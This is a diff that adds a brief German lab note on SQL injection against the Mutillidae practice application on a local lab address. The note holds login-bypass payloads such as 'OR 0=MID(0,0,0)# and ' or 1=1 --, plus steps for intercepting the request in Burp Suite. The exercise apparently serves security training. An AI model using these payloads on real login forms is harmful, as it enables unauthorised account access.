@@ -1,0 +1,23 @@
+#==============================#
+#   SQL Injection   #
+#==============================#
+
+Multilidale
+http://10.10.10.103/mutillidae/
+
+Login/Register aufrufen
+Eingeba Feld "true" sein lassen
+
+'OR 0=MID(0,0,0)#
+'OR 0=MID(1,0,-1)#
+"' or 1=1 -- " eingeben in das Namesfeld
+
+toggle 1x Security
+
+Login mit der Burb Suit abfangen
+im Param
+
+das username Fled mit einer Injection füllen wie:
+'OR 0=MID(0,0,0)#
+
+senden, Hacked
